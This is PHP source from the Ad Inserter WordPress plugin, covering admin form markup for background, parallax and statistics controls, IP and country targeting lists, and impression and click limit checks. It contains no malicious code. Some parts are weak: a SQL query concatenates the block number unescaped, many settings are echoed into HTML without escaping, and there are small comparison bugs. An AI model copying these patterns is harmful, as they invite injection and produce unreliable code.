              <input style="" id="body-background-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_SET_BODY_BACKGROUND, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_set_body_background (); ?>" <?php if ($obj->get_set_body_background () == AI_ENABLED) echo 'checked '; ?> />
              <label for="body-background-<?php echo $block; ?>"><?php /* translators: %s HTML body tag */ printf (__('Set %s background', 'ad-inserter'), '<pre style="display: inline; color: blue;">&lt;body&gt;</pre>'); ?></label>
            </span>
<?php endif; ?>

          </div>

          <div class="max-input bkg-parameters" style="margin: 8px 0 0 0;<?php echo ($obj->get_background () && $obj->get_horizontal_position () == AI_STICK_HORIZONTAL_CENTER) ? '' : ' display: none;'; ?>">
            <div class="banner-preview" style="padding: 5px 5px 0px 5px; min-width: 56px; min-height: 56px; border: 1px solid #ddd;">
              <img id="bkg-image-<?php echo $block; ?>" src="<?php echo $obj->get_background_image (); ?>" style="<?php echo trim ($obj->get_background_image ()) != '' ? '' : ' display: none;'; ?>" />
            </div>
            <table class="ai-settings-table">
              <tr>
                <td colspan="4" style="width: 80%; padding-bottom: 2px;">
                  <input id="bkg-image-url-<?php echo $block; ?>" style="width: 100%;" title="<?php _e ("Image to be used for the background", 'ad-inserter'); ?>" type="text" size="70" maxlength="300" name="<?php echo AI_OPTION_BACKGROUND_IMAGE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="<?php echo $obj->get_background_image (); ?>" default="<?php echo $default->get_background_image (); ?>" />
                </td>
              </tr>
              <tr>
                <td>
                  <?php _e ('Color', 'ad-inserter'); ?>
                  <input id="bkg-color-<?php echo $block; ?>" style="font-family: monospace;" title="<?php _e ("Color to be used for the background", 'ad-inserter'); ?>" type="text" size="7" maxlength="7" name="<?php echo AI_OPTION_BACKGROUND_COLOR, WP_FORM_FIELD_POSTFIX, $block; ?>" value="<?php echo $obj->get_background_color (); ?>" default="<?php echo $default->get_background_color (); ?>" />
                </td>
                <td>
                  <?php _e ('Image size', 'ad-inserter'); ?>
                  &nbsp;
                  <select id="bkg-size-<?php echo $block; ?>" name="<?php echo AI_OPTION_BACKGROUND_SIZE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_background_size (); ?>">
                     <option value="<?php echo AI_BACKGROUND_SIZE_DEFAULT; ?>" <?php echo ($background_size == AI_BACKGROUND_SIZE_DEFAULT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DEFAULT_BKG_SIZE; ?></option>
                     <option value="<?php echo AI_BACKGROUND_SIZE_COVER; ?>" <?php echo ($background_size == AI_BACKGROUND_SIZE_COVER) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_COVER; ?></option>
                     <option value="<?php echo AI_BACKGROUND_SIZE_FIT; ?>" <?php echo ($background_size == AI_BACKGROUND_SIZE_FIT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_FIT_BKG_SIZE; ?></option>
                     <option value="<?php echo AI_BACKGROUND_SIZE_FILL; ?>" <?php echo ($background_size == AI_BACKGROUND_REPEAT_HORIZONTALY) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_FILL; ?></option>
                  </select>
                </td>
                <td>
                  <?php _e ('Repeat', 'ad-inserter'); ?>
                  &nbsp;
                  <select id="bkg-repeat-<?php echo $block; ?>" name="<?php echo AI_OPTION_BACKGROUND_REPEAT, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_background_repeat (); ?>">
                     <option value="<?php echo AI_BACKGROUND_REPEAT_DEFAULT; ?>" <?php echo ($background_repeat == AI_BACKGROUND_REPEAT_DEFAULT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DEFAULT_BKG_REPEAT; ?></option>
                     <option value="<?php echo AI_BACKGROUND_REPEAT_NO; ?>" <?php echo ($background_repeat == AI_BACKGROUND_REPEAT_NO) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_NO; ?></option>
                     <option value="<?php echo AI_BACKGROUND_REPEAT_YES; ?>" <?php echo ($background_repeat == AI_BACKGROUND_REPEAT_YES) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_YES; ?></option>
                     <option value="<?php echo AI_BACKGROUND_REPEAT_HORIZONTALY; ?>" <?php echo ($background_repeat == AI_BACKGROUND_REPEAT_HORIZONTALY) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_HORIZONTALY; ?></option>
                     <option value="<?php echo AI_BACKGROUND_REPEAT_VERTICALLY; ?>" <?php echo ($background_repeat == AI_BACKGROUND_REPEAT_VERTICALLY) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_VERTICALLY; ?></option>
                     <option value="<?php echo AI_BACKGROUND_REPEAT_SPACE; ?>" <?php echo ($background_repeat == AI_BACKGROUND_REPEAT_SPACE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SPACE; ?></option>
                     <option value="<?php echo AI_BACKGROUND_REPEAT_ROUND; ?>" <?php echo ($background_repeat == AI_BACKGROUND_REPEAT_ROUND) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ROUND; ?></option>
                  </select>
                </td>
                <td style="text-align: right;">
                    <button id="select-bkg-image-button-<?php echo $block; ?>" type="button" class='ai-button select-image' style="min-width: 75px; margin-right: 0; display: none;"><?php _e ('Select image', 'ad-inserter'); ?></button>
                </td>
              </tr>
            </table>
            <div style="clear: both;"></div>
          </div>
        </div>

<?php
  }
}

function ai_parallax ($block, $obj, $default) {
  if (ai_settings_check ('AD_INSERTER_PARALLAX')) :
?>
        <div class="ai-rounded">
          <table class="ai-responsive-table ai-images" style="width: 100%; border-spacing: 0;">
            <tbody>
              <tr>
                <td colspan="2">
                  <?php _e('Parallax mode', 'ad-inserter'); ?>
                  <select id="parallax-mode-<?php echo $block; ?>" style="margin: -4px 0 0 0;" name="<?php echo AI_OPTION_PARALLAX_MODE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_parallax_mode(); ?>">
                     <option value="<?php echo AI_PARALLAX_MODE_BLOCK; ?>" <?php echo ($obj->get_parallax_mode() == AI_PARALLAX_MODE_BLOCK) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_BLOCK; ?></option>
                     <option value="<?php echo AI_PARALLAX_MODE_BACKGROUND; ?>" <?php echo ($obj->get_parallax_mode() == AI_PARALLAX_MODE_BACKGROUND) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENG_BACKGROUND; ?></option>
                  </select>
                </td>
              </tr>

<?php
            for ($bkg = 1; $bkg <= 3; $bkg ++) {
?>
              <tr>
                <td style="width: 1%;">
                  <input type="hidden" name="<?php echo AI_OPTION_PARALLAX, '_', $bkg, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input type="checkbox" name="<?php echo AI_OPTION_PARALLAX, '_', $bkg, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" style="vertical-align: top;" default="<?php echo $default->get_parallax ($bkg); ?>" <?php if ($obj->get_parallax ($bkg) == AI_ENABLED) echo 'checked '; ?> />
                </td>
                <td style="width: 75%;">
                  <input class="parallax-image" style="width: 100%;" placeholder="<?php _e ("Parallax background", 'ad-inserter'); echo ' ', $bkg; ?>" title="<?php _e ("Image to be used for the background", 'ad-inserter'); ?>" type="text" size="70" maxlength="300" name="<?php echo AI_OPTION_PARALLAX_IMAGE, '_', $bkg, WP_FORM_FIELD_POSTFIX, $block; ?>" value="<?php echo $obj->get_parallax_image ($bkg); ?>" default="<?php echo $default->get_parallax_image ($bkg); ?>" />
                </td>
                <td style="width: 1%;">
                  <button class="parallax-button ai-button ai-button-small" type="button" title="<?php _e ('Select background image', 'ad-inserter'); ?>"></button>
                </td>
                <td style="width: 1%;">
                  &nbsp;
                  <?php _e ('Shift', 'ad-inserter'); ?>
                  <input type="text" name="<?php echo AI_OPTION_PARALLAX_SHIFT, '_', $bkg, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_parallax_shift ($bkg); ?>" value="<?php echo $obj->get_parallax_shift ($bkg); ?>" title= "<?php _e ('Background image shift in pixels when the block scrolls from top to bottom, empty means no shift', 'ad-inserter'); ?>" size="3" maxlength="5" />
                </td>
              </tr>
<?php
            }
?>
              <tr>
                <td style="width: 75%;" colspan="2">
                  <input style="width: 100%;" placeholder="<?php _e ("Link", 'ad-inserter'); ?>" title="<?php _e ("The destination page when the background is clicked", 'ad-inserter'); ?>" type="text" size="70" maxlength="300" name="<?php echo AI_OPTION_PARALLAX_LINK, WP_FORM_FIELD_POSTFIX, $block; ?>" value="<?php echo $obj->get_parallax_link (); ?>" default="<?php echo $default->get_parallax_link (); ?>" />
                </td>
                <td style="width: 1%;" colspan="2" title="<?php _e ("Open link in a new tab", 'ad-inserter'); ?>">
                  <input type="hidden" name="<?php echo AI_OPTION_PARALLAX_LINK_NEW_TAB, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
                  <input type="checkbox" name="<?php echo AI_OPTION_PARALLAX_LINK_NEW_TAB, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" style="margin-left: 5px; vertical-align: top;" default="<?php echo $default->get_parallax_link_new_tab (); ?>" <?php if ($obj->get_parallax_link_new_tab () == AI_ENABLED) echo 'checked '; ?> />
                  <?php _e ("New tab", 'ad-inserter'); ?>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
<?php
  endif;
}

function chart_range ($max_value, $integer_value = false) {
  $scale = $max_value == 0 ? ($integer_value ? 5 : 1) : pow (10, intval (log10 ($max_value)));
  if ($max_value < 1) $scale = $scale / 10;
  if ($max_value > 5 * $scale) $scale *= 2;

  $chart_range = intval (($max_value + $scale ) / $scale ) * $scale;

  if ($integer_value) {
    if ($chart_range <= 5) {
      $chart_range = 5;
    } elseif ($chart_range <= 10) {
      $chart_range = 10;
    }
  }

  return $chart_range;
}


function ai_statistics_container ($block, $block_tracking_enabled) {
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    $gmt_offset = get_option ('gmt_offset') * 3600;
    $today = date ("Y-m-d", time () + $gmt_offset);
    $year = date ("Y", time () + $gmt_offset);

    $global_tracking = get_global_tracking ();
    $block_tracking = $block_tracking_enabled;

    $icon_style = 'display: none;';
    $icon_title = '';

    if (!$global_tracking) {
      $warning_style = '';
      $warning_title = __('Tracking is globally disabled', 'ad-inserter');
    }
    elseif (!$block_tracking) {
      $warning_style = '';
      $warning_title = __('Tracking for this block is disabled', 'ad-inserter');
    }
    else {
      $warning_style = 'display: none;';
      $warning_title = '';

      $icon_style = '';
      $icon_title = __('Double click to toggle controls in public reports', 'ad-inserter');
    }

?>
  <div id='statistics-container-<?php echo $block; ?>' style='margin: 8px 0; display: none;'>
    <div id='statistics-elements-<?php echo $block; ?>' class='ai-charts' style='margin: 8px 0;'>
      <div class='ai-chart-container'><div style='position: absolute; top: 0px; left: 8px;'><?php _e ('Loading...', 'ad-inserter'); ?></div>
        <div class='ai-chart not-configured' style='margin: 8px 0;'></div>
      </div>
<?php
  if ($block != 0) {
?>
      <div class='ai-chart not-configured' style='margin: 8px 0;'></div>
      <div class='ai-chart not-configured' style='margin: 8px 0;'></div>
<?php
  }
?>
    </div>
    <div id='custom-range-controls-<?php echo $block; ?>' class="custom-range-controls" range-name="l030" style='margin: 8px auto;'>
      <span class="ai-toolbar-button text" title='<?php echo $warning_title; ?>' style='font-size: 20px; vertical-align: middle; padding: 0; <?php echo $warning_style; ?>'>&#x26A0;</span>

<?php if (ai_settings_check ('AD_INSERTER_REPORTS')): ?>
      <span class='ai-toolbar-button text ai-public-controls' title='<?php echo $icon_title; ?>' style='padding: 1px 0 0 0; <?php echo $icon_style; ?>'><span class="dashicons dashicons-admin-generic"></span></span>
<?php endif; ?>

      <span class="ai-toolbar-button text">
        <input type="checkbox" value="0" id="clear-range-<?php echo $block; ?>" style="display: none;" />
        <label class="checkbox-button" for="clear-range-<?php echo $block; ?>" title="<?php _e ('Clear statistics data for the selected range - clear both dates to delete all data for this block', 'ad-inserter'); ?>"><span class="checkbox-icon icon-none"></span></label>
      </span>
      <span class="ai-toolbar-button text">
        <input type="checkbox" value="0" id="auto-refresh-<?php echo $block; ?>" style="display: none;" />
        <label class="checkbox-button" for="auto-refresh-<?php echo $block; ?>" title="<?php _e ('Auto refresh data for the selected range every 60 seconds', 'ad-inserter'); ?>"><span class="checkbox-icon size-12 icon-auto-refresh"></span></label>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for last month', 'ad-inserter'); ?>" data-range-name="lmon" data-start-date="<?php echo date ("Y-m", strtotime ('-1 month') + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", strtotime ('-1 month') + $gmt_offset); ?>"><?php _e ('Last Month', 'ad-inserter'); ?></span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for this month', 'ad-inserter'); ?>" data-range-name="tmon" data-start-date="<?php echo date ("Y-m", time () + $gmt_offset); ?>-01" data-end-date="<?php echo date ("Y-m-t", time () + $gmt_offset); ?>"><?php _e ('This Month', 'ad-inserter'); ?></span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for this year', 'ad-inserter'); ?>" data-range-name="tyer" data-start-date="<?php echo $year; ?>-01-01" data-end-date="<?php echo $year; ?>-12-31"><?php _e ('This Year', 'ad-inserter'); ?></span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 15 days', 'ad-inserter'); ?>" data-range-name="l015" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 14 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">15</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range selected" title="<?php _e ('Load data for the last 30 days', 'ad-inserter'); ?>" data-range-name="l030" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">30</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 90 days', 'ad-inserter'); ?>" data-range-name="l090" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 89 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">90</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 180 days', 'ad-inserter'); ?>" data-range-name="l180" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 179 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">180</span>
      </span>
      <span class="ai-toolbar-button text">
        <span class="checkbox-button data-range" title="<?php _e ('Load data for the last 365 days', 'ad-inserter'); ?>" data-range-name="l365" data-start-date="<?php echo date ("Y-m-d", strtotime ($today) - 364 * 24 * 3600); ?>" data-end-date="<?php echo $today; ?>">365</span>
      </span>
      <span class="ai-toolbar-button text">
        <input class='ai-date-input' id="chart-start-date-<?php echo $block; ?>" type="text" value="<?php echo date ("Y-m-d", strtotime ($today) - 29 * 24 * 3600); ?>" />
      </span>
      <span class="ai-toolbar-button text">
        <input class='ai-date-input' id="chart-end-date-<?php echo $block; ?>" type="text" value="<?php echo $today; ?>" />
      </span>
      <span class="ai-toolbar-button text">
        <input type="checkbox" value="0" id="load-custom-range-<?php echo $block; ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
        <label class="checkbox-button" for="load-custom-range-<?php echo $block; ?>" title="<?php _e ('Load data for the selected range', 'ad-inserter'); ?>"><span class="checkbox-icon size-12 icon-loading"></span></label>
      </span>
    </div>
    <div style="clear: both;"></div>
    <div id='load-error-<?php echo $block; ?>' class="custom-range-controls" style='text-align: center; color: red; margin: 8px 0; width: 100%;'></div>
  </div>
<?php
  }
}

function ai_settings_container ($block, $obj) {
  if (!ai_remote_plugin_data ('pro', true)) return;
?>
  <div id="export-container-<?php echo $block; ?>" style="display: none; padding:8px;">
    <div style="display: inline-block; padding: 2px 10px; float: right;">
      <input type="hidden"   name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
      <input type="checkbox" name="<?php echo AI_OPTION_IMPORT, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="0" id="import-<?php echo $block; ?>" />
      <label for="import-<?php echo $block; ?>" style="padding-right: 10px;" title="<?php _e ('Import settings when saving - if checked, the encoded settings below will be imported for this block', 'ad-inserter'); ?>"><?php _e ('Import settings for block', 'ad-inserter'); ?> <?php echo $block; ?></label>

      <input type="hidden"   name="<?php echo AI_OPTION_IMPORT_NAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
      <input type="checkbox" name="<?php echo AI_OPTION_IMPORT_NAME, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="1" id="import-name-<?php echo $block; ?>" checked />
      <label for="import-name-<?php echo $block; ?>" title="<?php _e ("Import block name when saving - if checked and 'Import settings for block' is also checked, the name from encoded settings below will be imported for this block", 'ad-inserter'); ?>"><?php _e ('Import block name', 'ad-inserter'); ?></label>
    </div>

    <div style="float: left; padding-left:10px;">
      <?php _e ('Saved settings for block', 'ad-inserter'); ?> <?php echo $block; ?>
    </div>
    <textarea id="export_settings_<?php echo $block; ?>" style="background-color:#F9F9F9; font-family: monospace, Courier, 'Courier New'; font-weight: bold; width: 719px; height: 324px;"></textarea>
  </div>

<?php
  ai_statistics_container ($block, $obj->get_tracking (true));
}

function ai_settings_global_buttons () {
  if (!ai_remote_plugin_data ('pro', true)) return;

?>
    <span style="vertical-align: top; margin-left: 5px;">
      <input type="checkbox" value="0" id="export-switch-0" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>" site-url="<?php echo wp_make_link_relative (get_site_url()); ?>" style="display: none;" />
      <label class="checkbox-button" for="export-switch-0" title="<?php _e ('Export / Import Ad Inserter Pro Settings', 'ad-inserter'); ?>"><span class="checkbox-icon icon-export-import"></span></label>
    </span>
<?php
}

function ai_settings_global_actions () {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {

    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    if ($connected_website !== false) {
      if (!$connected_website ['plugin-data']['write']) return;
    }

?>
      <div style="min-width: 170px; display: inline-block;">
        <input id="clear-statistics-0"
          onclick="if (confirm('<?php _e ('Are you sure you want to clear all statistics data for all blocks?', 'ad-inserter'); ?>')) {document.getElementById ('clear-statistics-0').style.visibility = 'hidden'; document.getElementById ('clear-statistics-0').value = '0'; return true;} return false;"
          name="<?php echo AI_FORM_CLEAR_STATISTICS; ?>"
          value="<?php _e ('Clear All Statistics Data', 'ad-inserter'); ?>" type="submit" style="display: none; margin-left: 8px; font-weight: bold; color: #e44;" />
      </div>
<?php
  }
}

function ai_settings_side () {
}

function ai_lists ($obj) {
  global $ip_address_list, $country_list;

  if (!ai_remote_plugin_data ('pro', true)) return false;

  $ip_address_list = $obj->get_ad_ip_address_list ();
  $country_list    = $obj->get_ad_country_list ();

  return
    $ip_address_list != '' ||
    $country_list != '';
}

function ai_list_rows_2 ($block, $default, $obj) {
  global $ip_address_list, $country_list;

  if (!ai_remote_plugin_data ('pro', true)) return;

  $ip_address_list = $obj->get_ad_ip_address_list ();
  $country_list    = $obj->get_ad_country_list ();

  $show_ip_address_list = $ip_address_list != '';
  $show_country_list    = $country_list != '';

  if (ai_settings_check ('AD_INSERTER_MAXMIND')) {
    $country_city_attr = ' id="country-city-' . $block . '" ' . ' title="' . __ ('Toggle country/city editor', 'ad-inserter') . '" style="cursor: pointer;"';
  } else $country_city_attr = '';

?>
        <tr class="<?php if ($show_ip_address_list) echo 'list-items'; ?>" style="<?php if (!$show_ip_address_list) echo ' display: none;'; ?>">
          <td>
            <?php _e ('IP Addresses', 'ad-inserter'); ?>
          </td>
          <td>
            <button id="ip-address-button-<?php echo $block; ?>" type="button" class='ai-button ai-button-small' title="<?php _e ('Toggle IP address editor', 'ad-inserter'); ?>"></button>
          </td>
          <td style="padding-right: 7px; width: 92%;">
            <input id="ip-address-list-<?php echo $block; ?>" class="ai-list-sort" style="animation-name: unset; width: 100%;" title="<?php _e ('Comma separated IP addresses, you can also use partial IP addresses with * (ip-address-start*. *ip-address-pattern*, *ip-address-end)', 'ad-inserter'); ?>" type="text" name="<?php echo AI_OPTION_IP_ADDRESS_LIST, WP_FORM_FIELD_POSTFIX, $block; ?>" id="ip-address-list-<?php echo $block; ?>" default="<?php echo $default->get_ad_ip_address_list(); ?>" value="<?php echo $ip_address_list; ?>" size="54" maxlength="1500"/>
          </td>
          <td>
            <input type="hidden"   name="<?php echo AI_OPTION_IP_ADDRESS_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
            <input type="checkbox" name="<?php echo AI_OPTION_IP_ADDRESS_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo AI_BLACK_LIST; ?>" id="ip-address-list-input-<?php echo $block; ?>" <?php if ($obj->get_ad_ip_address_list_type() == AI_WHITE_LIST) echo 'checked '; ?> style="display: none;" />
            <span class="checkbox-button checkbox-list-button dashicons dashicons-<?php echo $obj->get_ad_ip_address_list_type() == AI_BLACK_LIST ? 'no' : 'yes'; ?>" title="<?php _e ('Click to select black or white list', 'ad-inserter'); ?>"></span>
          </td>
        </tr>
        <tr class="<?php if ($show_ip_address_list) echo 'list-items'; ?>" style="<?php if (!$show_ip_address_list) echo ' display: none;'; ?>">
          <td colspan="5">
            <textarea id="ip-address-editor-<?php echo $block; ?>" style="width: 100%; height: 220px; font-family: monospace, Courier, 'Courier New'; font-weight: bold; display: none;"></textarea>
          </td>
        </tr>

        <tr class="<?php if ($show_country_list) echo 'list-items'; ?>" style="<?php if (!$show_country_list) echo ' display: none;'; ?>">
          <td<?php echo $country_city_attr; ?>>
            <span><?php _e ('Countries', 'ad-inserter'); ?></span>
            <span style="display: none;"><?php _e ('Cities', 'ad-inserter'); ?></span>
          </td>
          <td>
            <span>
              <button id="country-button-<?php echo $block; ?>" type="button" class='ai-button ai-button-small' title="<?php _e ('Toggle country editor', 'ad-inserter'); ?>"></button>
            </span>
            <span style="display: none;">
              <button id="city-button-<?php echo $block; ?>" type="button" data-list="country" class='ai-button ai-button-small' title="<?php _e ('Toggle city editor', 'ad-inserter'); ?>"></button>
            </span>
          </td>
          <td style="padding-right: 7px; width: 92%;">
            <input id="country-list-<?php echo $block; ?>" class="ai-list-country-case ai-list-custom" style="animation-name: unset; width: 100%;" title="<?php _e ('Comma separated country ISO Alpha-2 codes', 'ad-inserter'); ?>" type="text" name="<?php echo AI_OPTION_COUNTRY_LIST, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_ad_country_list(); ?>" value="<?php echo $country_list; ?>" size="54" maxlength="1500"/>
          </td>
          <td>
            <input type="hidden"   name="<?php echo AI_OPTION_COUNTRY_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
            <input type="checkbox" name="<?php echo AI_OPTION_COUNTRY_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo AI_BLACK_LIST; ?>" id="country-list-input-<?php echo $block; ?>" <?php if ($obj->get_ad_country_list_type() == AI_WHITE_LIST) echo 'checked '; ?> style="display: none;" />
            <span class="checkbox-button checkbox-list-button dashicons dashicons-<?php echo $obj->get_ad_country_list_type() == AI_BLACK_LIST ? 'no' : 'yes'; ?>" title="<?php _e ('Click to select black or white list', 'ad-inserter'); ?>"></span>
          </td>
        </tr>
        <tr class="<?php if ($show_country_list) echo 'list-items'; ?>" style="<?php if (!$show_country_list) echo ' display: none;'; ?>">
          <td colspan="5" class="country-flags">
            <select id="country-select-<?php echo $block; ?>" multiple="multiple" default="" style="display: none;"></select>
            <select id="city-select-<?php echo $block; ?>" class="ai-list-filter" multiple="multiple" default="" style="display: none;"></select>
          </td>
        </tr>
<?php
}

function expanded_country_list ($country_list) {
  global $ad_inserter_globals;

  for ($group = ai_settings_value ('AD_INSERTER_GEO_GROUPS'); $group >= 1; $group --) {
    $global_name = 'G'.$group;
    $iso_name = 'G'.($group % 10);
    $country_list = str_replace ($iso_name, $ad_inserter_globals [$global_name], $country_list);
  }
  return $country_list;
}

function ai_check_lists ($obj, $server_side_check) {
  global $ai_last_check, $ai_wp_data;

  if ($server_side_check) {
    $ai_last_check = AI_CHECK_IP_ADDRESS;
    if (!check_ip_address ($obj)) return false;

    $ai_last_check = AI_CHECK_COUNTRY;
    if (!check_country ($obj)) return false;
  }

  return true;
}

function ai_get_impressions_and_clicks ($block, $days, $update = false, $get_ctr = false) {
  global $wpdb;

  $days = intval ($days);
  if ($days < 1) $days = 1;

  $transient_name = AI_TRANSIENT_STATISTICS. '-' . $block . '-' . $days;

  if (!$update && ($data = get_transient ($transient_name)) !== false) {
    return $data;
  }

  $gmt_offset = get_option ('gmt_offset') * 3600;
  $date = date ("Y-m-d", time () - ($days - 1) * 24 * 3600 + $gmt_offset);

  $results = $wpdb->get_results ('SELECT * FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE block = ' . $block, ARRAY_N);

  $impressions = 0;
  $impressions_period = 0;
  $clicks = 0;
  $clicks_period = 0;
  $version_impressions = array ();
  $version_clicks = array ();
  $ctr = array ();

  if (isset ($results [0])) {
    foreach ($results as $result) {
      if (($result [2] & AI_ADB_FLAG_BLOCKED) != 0) continue;

      if ($result [3] >= $date) {
        $impressions_period += $result [4];
        $clicks_period      += $result [5];

        if ($get_ctr) {
          $version = $result [2] & AI_ADB_VERSION_MASK;

          if (!isset ($version_impressions [$result [2]])) {
            $version_impressions [$version] = $result [4];
            $version_clicks      [$version] = $result [5];
          } else {
              $version_impressions [$version] += $result [4];
              $version_clicks      [$version] += $result [5];
            }
        }
      }

      $impressions += $result [4];
      $clicks      += $result [5];
    }
  }

  if ($get_ctr) {
    foreach ($version_impressions as $version => $version_impression) {
      if ($version_impression != 0) {
        $ctr [$version] = $version_clicks [$version] / $version_impression;
      } else $ctr [$version] = 0;
    }
  }

  $data = array ($impressions, $clicks, $impressions_period, $clicks_period, $ctr);

  set_transient ($transient_name, $data, AI_TRANSIENT_STATISTICS_EXPIRATION);

  return ($data);
}

function check_impression_and_click_limits ($block) {
  global $ai_last_check, $ai_wp_data, $block_object;

  $obj = $block_object [$block];

  if (($limit = $obj->get_limit_impressions_per_time_period ()) && ($days = intval ($obj->get_limit_impressions_time_period ()))) {
    $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);

    $ai_last_check = AI_CHECK_LIMIT_IMPRESSIONS_PER_TIME_PERIOD;
    if ($impressions_and_clicks [2] >= $limit) return false;
  }

  if (empty ($days)) $days = 1;

  if ($limit = $obj->get_max_impressions ()) {
    if (!isset ($impressions_and_clicks)) {
      $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);
    }

    $ai_last_check = AI_CHECK_MAX_IMPRESSIONS;
    if ($impressions_and_clicks [0] >= $limit) return false;
  }

  if (($limit = $obj->get_limit_clicks_per_time_period ()) && ($days = intval ($obj->get_limit_clicks_time_period ()))) {
    $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);

    $ai_last_check = AI_CHECK_LIMIT_CLICKS_PER_TIME_PERIOD;
    if ($impressions_and_clicks [3] >= $limit) return false;
  }

  if (empty ($days)) $days = 1;

  if ($limit = $obj->get_max_clicks ()) {
    if (!isset ($impressions_and_clicks)) {
      $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);
    }

    $ai_last_check = AI_CHECK_MAX_CLICKS;
    if ($impressions_and_clicks [1] >= $limit) return false;
  }

  return true;
}

function ai_check_impression_and_click_limits ($block, $check_fallback_block = true) {
  global $block_object, $ai_wp_data;

  $check_ok = check_impression_and_click_limits ($block);

  if (!$check_ok && $check_fallback_block) {
    if (!isset ($ai_wp_data [AI_FALLBACK_LEVEL])) $ai_wp_data [AI_FALLBACK_LEVEL] = 1; else $ai_wp_data [AI_FALLBACK_LEVEL] ++;

    $obj = $block_object [$block];

    $fallback = intval ($obj->get_limits_fallback());
    if ($fallback != $obj->number && $fallback != 0 && $fallback <= 96 && $ai_wp_data [AI_FALLBACK_LEVEL] <= 2) {
      $fallback_obj = $block_object [$fallback];
      if (check_impression_and_click_limits ($fallback) && $fallback_obj->check_scheduling (true)) {
        $obj->fallback = $fallback_obj->fallback != 0 ? $fallback_obj->fallback : $fallback;
        $check_ok = true;
      }
    }

    $ai_wp_data [AI_FALLBACK_LEVEL] --;
  }

  return ($check_ok);
}

function check_ip_address ($obj) {
  if (function_exists ('check_ip_address_list')) {
    return check_ip_address_list ($obj->get_ad_ip_address_list (), $obj->get_ad_ip_address_list_type () == AI_WHITE_LIST);
  } else return true;
}

function check_country ($obj) {
  if (function_exists ('check_country_list')) {
    return check_country_list ($obj->get_ad_country_list (true), $obj->get_ad_country_list_type () == AI_WHITE_LIST);
  } else return true;
}

function ai_tags (&$ad_data) {
  global $ai_wp_data;

  if (strpos ($ad_data, '{ip') !== false || strpos ($ad_data, '{country') !== false) {
    if (!isset ($ai_wp_data [AI_TAGS]['IP_ADDRESS'])) {
